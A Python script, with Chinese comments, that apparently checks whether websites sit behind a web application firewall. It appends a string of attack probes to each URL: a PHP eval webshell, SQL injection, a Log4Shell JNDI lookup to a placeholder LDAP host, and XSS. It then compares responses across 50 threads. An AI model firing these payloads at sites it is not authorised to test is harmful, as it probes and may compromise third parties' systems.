import os
import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from openpyxl import Workbook
from openpyxl.styles import Border, Side, Font, Alignment
from openpyxl.utils import get_column_letter
from datetime import datetime
from bs4 import BeautifulSoup
from publicsuffixlist import PublicSuffixList
from urllib.parse import urlsplit
from urllib3.exceptions import InsecureRequestWarning
import logging

# 禁用不安全请求的警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
start_time = time.time()

def get_primary_domain(url):
    psl = PublicSuffixList()
    netloc = urlsplit(url).netloc.split(':')[0]
    domain = psl.privatesuffix(netloc)
    return domain

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

def get_response_info(url, headers):
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        soup = BeautifulSoup(response.content, 'html.parser')
        title = soup.title.string.strip() if soup.title and soup.title.string else "无标题"
        status_code = response.status_code
        return title, status_code
    except requests.exceptions.Timeout:
        return "请求超时", 1
    except requests.exceptions.ConnectionError:
        return "连接被拒绝", 0

# 初始化日志配置
def init_logger(log_file="waf_check_v1.6.log"):
    logger = logging.getLogger("WAFLogger")
    logger.setLevel(logging.INFO)

    # 控制台输出
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)

    # 文件输出
    file_handler = logging.FileHandler(log_file, encoding="utf-8")
    file_handler.setLevel(logging.INFO)

    # 格式
    formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
    console_handler.setFormatter(formatter)
    file_handler.setFormatter(formatter)

    # 添加到 logger
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)

    return logger

# 使用示例
logger = init_logger()

def log(msg, level="info"):
    if level == "error":
        logger.error(msg)
    elif level == "warning":
        logger.warning(msg)
    else:
        logger.info(msg)

def determine_waf_status(before_code, before_title, after_code, after_title):
    if(before_code == 200):
        if after_code in [403, 0, 1]:
            return '存在防护'
        elif(after_code == 200 and before_title == after_title):
            return '不存在防护'
        elif after_code in [500, 502, 504]:
            return '疑似存在防护'
        else:
            return '疑似存在防护'
    elif(before_code != 0 and before_code != 1):
        if(after_code == 0 or after_code == 1):
            return '存在防护'
        elif((after_code != before_code) or (after_code == before_code and before_title != after_title)):
            return '疑似存在防护'
        elif(after_code == before_code and before_title == after_title):
            return '不存在防护'
        else:
            return '漏网之鱼'
    elif(before_code == 0):
        return '站点无法访问'
    else:
        return '请求失败'

def check_waf(url, payloads, headers=None):
    results = []
    for payload in payloads:
        target_url = url + payload
        domain = get_primary_domain(url)
        before_title, before_code = get_response_info(url, headers)
        after_title, after_code = get_response_info(target_url, headers)
        waf_status = determine_waf_status(before_code, before_title, after_code, after_title)
        log(f"""
=======================================
{url}
----------------不含poc----------------
{before_code} {before_title}
----------------含poc------------------
{after_code} {after_title}
--------------检测结果-----------------
{waf_status}
""")
        result = {
            'URL': url,
            'Payload': target_url,
            'domain': domain,
            'before_code': before_code,
            'before_title': before_title,
            'after_code': after_code,
            'after_title': after_title,
            'WAF_Status': waf_status
        }
        results.append(result)
    return results

def get_filename_without_extension(file_path):
    base_name = os.path.basename(file_path)
    file_name_without_extension, _ = os.path.splitext(base_name)
    return file_name_without_extension

def set_border(sheet):
    border = Border(left=Side(style='thin'), right=Side(style='thin'),
                    top=Side(style='thin'), bottom=Side(style='thin'))
    for row in sheet.iter_rows(min_row=1, max_row=sheet.max_row, min_col=1, max_col=sheet.max_column):
        for cell in row:
            cell.border = border

def set_columns(sheet):
    for col in sheet.columns:
        max_length = 0
        column = [cell for cell in col]
        for cell in column:
            try:
                if len(str(cell.value)) > max_length:
                    max_length = len(cell.value)
            except:
                pass
        adjusted_width = (max_length + 2)
        sheet.column_dimensions[get_column_letter(col[0].column)].width = adjusted_width

# 主程序入口
url_file_path = 'urls.txt'
try:
    url_file_path = sys.argv[1]
    file_name = get_filename_without_extension(url_file_path)
except:
    print('请输入txt文件名，默认读取urls.txt！')
    print('python3 check-waf.py urls.txt')
    sys.exit()

urls = read_urls_from_file(url_file_path)
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
payloads = ["?a=<%3fphp+%40eval($_GET['cmd'])%3b%3f>&b=1'+or+'1'%3d'1&c=${jndi%3aldap%3a//10.0.0.1%3a8080/Exploit}&s=<script>alert(1)</script>&id=UNION+SELECT+ALL+FROM+information_schema+AND+'+or+SLEEP(5)+or+'"]

results = []

# 使用线程池并行执行
with ThreadPoolExecutor(max_workers=50) as executor:  # 可以根据机器性能调整线程数
    future_to_url = {executor.submit(check_waf, url, payloads, headers): url for url in urls}
    for future in as_completed(future_to_url):
        try:
            res = future.result()
            results.extend(res)
        except Exception as e:
            log(f"Error processing {future_to_url[future]}: {e}")

end_time = time.time()
elapsed_time = end_time - start_time
days, rem = divmod(elapsed_time, 86400)
hours, rem = divmod(rem, 3600)
minutes, seconds = divmod(rem, 60)
time_str = ""
if days > 0:
    time_str += f"{int(days)}天 "
if days > 0 or hours > 0:
    time_str += f"{int(hours)}小时 "
if days > 0 or hours > 0 or minutes > 0:
    time_str += f"{int(minutes)}分钟 "
time_str += f"{seconds:.2f}秒"
log(f"运行时间: {time_str}")

# 写入 Excel
wb = Workbook()
ws = wb.active
for i, title in enumerate(["URL", "domain","before_code", "before_title", "after_code", "after_title", "WAF_Status", "Payload"], start=1):
    cell = ws.cell(row=1, column=i, value=title)
    cell.font = Font(bold=True)
    cell.alignment = Alignment(horizontal='center', vertical='center')

for i, result in enumerate(results, start=2):
    ws.cell(row=i, column=1, value=result['URL'])
    ws.cell(row=i, column=2, value=result['domain'])
    ws.cell(row=i, column=3, value=result['before_code'])
    ws.cell(row=i, column=4, value=result['before_title'])
    ws.cell(row=i, column=5, value=result['after_code'])
    ws.cell(row=i, column=6, value=result['after_title'])
    ws.cell(row=i, column=7, value=result['WAF_Status'])
    ws.cell(row=i, column=8, value=result['Payload'])

set_border(ws)
set_columns(ws)

current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
wb.save(f"{file_name}_waf_results_{current_time}.xlsx")
